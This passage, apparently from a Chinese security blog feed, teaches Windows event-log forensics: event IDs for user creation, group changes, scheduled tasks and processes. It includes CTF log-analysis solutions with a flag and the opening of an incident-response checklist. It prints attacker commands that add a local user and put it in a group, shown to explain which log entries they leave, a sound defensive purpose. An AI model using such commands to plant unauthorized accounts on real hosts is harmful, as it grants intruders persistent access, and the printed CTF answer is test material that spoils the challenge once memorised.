+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;用户名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;密码&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/5.png&#34;
+	width=&#34;1959&#34;
+	height=&#34;960&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/5_hu_7d9b0ca6f18a9f69.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/5_hu_c638f8ccbea84238.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;204&#34;
+		data-flex-basis=&#34;489px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;SAM事件ID-4656：那么同样的若权限不足，则该事件也会被记录下来，但是需要注意的是该事件不会是4720，而是事件4656。因为只有对SAM有更改权限才能够对用户进行创建，无论是创建成功还是失败都会触发SAM的请求句柄事件，事件ID都为4656。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/6.png&#34;
+	width=&#34;1602&#34;
+	height=&#34;885&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/6_hu_4e89431521491e88.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/6_hu_276bee938c97635f.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;181&#34;
+		data-flex-basis=&#34;434px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;12447324733安全组管理记录&#34;&gt;1.2.4.4732/4733安全组管理记录
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在安全日志4732中可以查看攻击者将创建的用户加入到了哪个用户组中，4733则是查看用户从哪个组中移除了。&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;localgroup&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;组名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;用户名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/7.png&#34;
+	width=&#34;1833&#34;
+	height=&#34;907&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/7_hu_4b5a4a5829589be4.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/7_hu_3ee420f65f9c01fc.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;202&#34;
+		data-flex-basis=&#34;485px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;125计划任务事件id-46984699470047014702&#34;&gt;1.2.5.计划任务事件ID-4698、4699、4700、4701、4702
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在该事件记录信息中，计划任务schtasks以及at都会被记录在内：包括创建者、任务名称、任务内容等。4698 计划任务已创建、4699 计划任务已删除、4700 计划任务已启用、4701 计划任务已停用、4702 计划任务已更。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/8.png&#34;
+	width=&#34;1986&#34;
+	height=&#34;872&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/8_hu_801e221a843b4f74.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/8_hu_99d0d478dca16dd3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;227&#34;
+		data-flex-basis=&#34;546px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;126进程创建及终止记录46884689&#34;&gt;1.2.6.进程创建及终止记录4688/4689
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;要记录该日志，需要编辑完毕本地审计策略后重启计算机，重启后便可以记录每一个被启动的进程日志，包括软件进程。那么可以根据是否有运行WINWORD.EXE来判断某个时间点用户是否有打开word进程，举一反三。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/9.png&#34;
+	width=&#34;2016&#34;
+	height=&#34;795&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/9_hu_f42d129b29e3fe96.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/9_hu_e4cf3cae426a02.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;253&#34;
+		data-flex-basis=&#34;608px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h1 id=&#34;2ctf中常见windows日志分析题&#34;&gt;2.CTF中常见Windows日志分析题
+&lt;/h1&gt;&lt;h2 id=&#34;21蓝桥杯ezevtx&#34;&gt;2.1.蓝桥杯&amp;mdash;EZevtx
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/10.png&#34;
+	width=&#34;1239&#34;
+	height=&#34;757&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/10_hu_380e00d6a30a561f.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/10_hu_cfa67866b27fb97e.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;163&#34;
+		data-flex-basis=&#34;392px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在安全日志中，查找事件 ID 为 4663 的条目，该事件表示“尝试访问对象”。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/11.png&#34;
+	width=&#34;2281&#34;
+	height=&#34;1134&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/11_hu_d3b2b5f5ae6c5982.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/11_hu_c9d72a10c799a298.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;201&#34;
+		data-flex-basis=&#34;482px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;confidenal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;docx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;22软件系统安全赛&#34;&gt;2.2.软件系统安全赛
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;小梁的域控机器被黑客攻击了，请你找出一些蛛丝马迹。 攻击者在获取域管理员权限后，尝试上传木马文件，但是被杀毒软件查杀，上传的木马文件的绝对路径是什么？（如C:\Windows\cmd.exe）&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(63, 63, 63);&#34;&gt;要查找被查杀的木马文件的话，可以通过找相关查杀软件的日志或者查看 Windows 的事件记录。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(63, 63, 63);&#34;&gt;在 &lt;/font&gt;&lt;code&gt;Windows\System32\winevt\Logs 文件夹找到 Windows Defender 的事件记录文件：&lt;/code&gt;Microsoft-Windows-Windows Defender%4Operational.evtx`&lt;font style=&#34;color:rgb(63, 63, 63);&#34;&gt;，然后查看其中内容，很容易在最近的一条事件中找到对应的木马文件：&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;事件ID&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1116&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/12.png&#34;
+	width=&#34;2267&#34;
+	height=&#34;1104&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/12_hu_cfdbed5114e50075.png 480w, https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/12_hu_5e217768f0a21668.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;205&#34;
+		data-flex-basis=&#34;492px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Windows应急响应方法论</title>
+        <link>https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/</link>
+        <pubDate>Thu, 26 Jun 2025 23:55:19 +0800</pubDate>
+        
+        <guid>https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/</guid>
+        <description>&lt;img src="https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/logo.png" alt="Featured image of post Windows应急响应方法论" /&gt;&lt;h2 id=&#34;1应急响应基本原则&#34;&gt;1.应急响应基本原则
+&lt;/h2&gt;&lt;h3 id=&#34;11及时止损防止扩散&#34;&gt;&lt;strong&gt;1.1.及时止损&amp;amp;防止扩散&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;及时止损：&lt;/strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;对内拔网线，对外封IP&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;对于已经失陷的主机来说，如果主机是核心业务服务器，不适合拔网线，只能在防火墙上对IP进行封禁&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;12保留现场环境与客户沟通&#34;&gt;&lt;strong&gt;1.2.保留现场环境与客户沟通&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;事前沟通，明确信息，什么类型的应急（APT，勒索，挖矿，后门，DDOS），什么主机（主机所处环境），有什么异常特征&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.yuque.com/juwangyizhu/tr4ndd/pesbgs&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;1. Windows入侵排查&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;应急响应就是要站在攻击者的角度进行排查，攻击者拿到一台主机会如何攻击，一般都是先信息收集&amp;mdash;&amp;gt;提权&amp;mdash;&amp;gt;维权&amp;mdash;&amp;gt;横向，那么我们应急响应的思路也应该是按照攻击者的思路来进行应急&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/1.png&#34;
+	width=&#34;1115&#34;
+	height=&#34;656&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/1_hu_d352cb7d07db9f2a.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/1_hu_eded06ce0bc7a47c.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;407px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2主机信息收集&#34;&gt;2.主机信息收集
+&lt;/h2&gt;&lt;h3 id=&#34;21基础信息收集&#34;&gt;2.1.基础信息收集
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;msinfo&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;//查看服务器的系统信息
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/2.png&#34;
+	width=&#34;1918&#34;
+	height=&#34;1113&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/2_hu_22f671baac1484c0.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/2_hu_f0e5fc5cf8b36ffd.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;172&#34;
+		data-flex-basis=&#34;413px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;主要看软件环境：环境变量/启动项/网络连接/服务等等情况&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/3.png&#34;
+	width=&#34;2228&#34;
+	height=&#34;1094&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/3_hu_52b16386a9757fa5.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/3_hu_1b0e6c3c102ffecd.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;203&#34;
+		data-flex-basis=&#34;488px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;22网络信息收集&#34;&gt;2.2.网络信息收集
+&lt;/h3&gt;&lt;p&gt;排查是否有恶意外联IP地址，将可疑的IP地址批量放到微步社区查询，重点关注云主机IP&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;netstat&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;-ano&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;netstat&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;-rn&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;//查看路由表
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/4.png&#34;
+	width=&#34;1474&#34;
+	height=&#34;712&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/4_hu_316745dc381ab015.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/4_hu_f1e8796703eafccb.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;207&#34;
+		data-flex-basis=&#34;496px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/5.png&#34;
+	width=&#34;2529&#34;
+	height=&#34;863&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/5_hu_4a718639057d4d8.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/5_hu_f9bbd7a5fa579447.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;293&#34;
+		data-flex-basis=&#34;703px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;根据PID查找文件对应位置&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;wmic&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;process&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;processid=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28284&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;ExecutablePath&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;(Powershell)&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Get-Process&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;-Id&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28284&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Select-Object&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Path&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/6.png&#34;
+	width=&#34;1436&#34;
+	height=&#34;624&#34;
+	srcset=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/6_hu_f6d8cce091e09969.png 480w, https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/6_hu_3b223a98aa7f9ebb.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;230&#34;
+		data-flex-basis=&#34;552px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;23进程信息排查&#34;&gt;2.3.进程信息排查
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;tasklist&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;/svc&lt;/span&gt;                    &lt;span class=&#34;c1&#34;&gt;//查看进程
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;tasklist&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;/svc&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;|findstr&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;17716&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;//查看pid对应的进程信息
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;taskkill&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;/f&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;/pid&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;17716&lt;/span&gt;           &lt;span class=&#34;c1&#34;&gt;//杀掉进程
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;任务管理器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/7.png&#34;
+	width=&#34;1525&#34;
+	height=&#34;725&#34;
